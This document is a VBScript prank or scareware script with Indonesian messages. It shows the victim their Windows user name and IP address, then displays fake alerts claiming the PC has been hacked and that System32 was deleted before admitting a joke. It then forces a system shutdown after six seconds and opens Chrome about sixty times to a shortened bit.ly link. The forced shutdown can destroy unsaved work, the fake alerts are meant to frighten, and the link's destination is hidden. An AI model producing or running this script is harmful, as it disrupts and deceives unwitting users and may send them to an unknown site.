msgbox"Halo, Salken Aku Aris",64,"Arst"

strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2") 
Set colItems = objWMIService.ExecQuery( _
    "SELECT * FROM Win32_ComputerSystem",,48) 
For Each objItem in colItems
msgbox"Ini Nama mu ya?" & objItem.UserName ,48,"H̷̛́̎͂̉∞∞∞"
Next

dim NIC1, Nic, StrIP, CompName
Set NIC1 =     GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
For Each Nic in NIC1
    if Nic.IPEnabled then
        StrIP = Nic.IPAddress(0)
        Set WshNetwork = WScript.CreateObject("WScript.Network")
        CompName= WshNetwork.Computername
        MsgBox "IP mu ini kan?, "&StrIP ,4160,"H̷̛́̎͂̉∞∞∞"
    End if
Next

msgbox"Your pc has been hacked",16,"Spyware.exe"
msgbox"'..Windows\System32' has Deleted,Do you want to reboot? ",16,"Error!"
msgbox"NOTE: Jika file pc anda tidak ingin di hapus, Cepat hidupkan kembali Pc anda.",48,"H̷̛́̎͂̉∞∞∞"
msgbox"Hehehe Jangan panik dong, Cuma bercanda." ,48,"H̷̛́̎͂̉∞∞∞"

set shell = CreateObject("Wscript.Shell")
shell.run "shutdown.exe -s -t 6"

siteA = "https://bit.ly/3pQsLSC"
Const OneSecond = 10
Set browobj = CreateObject("Wscript.Shell")
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
browobj.Run "chrome -url "&siteA
WScript.Sleep OneSecond*1
Set browobj = nothing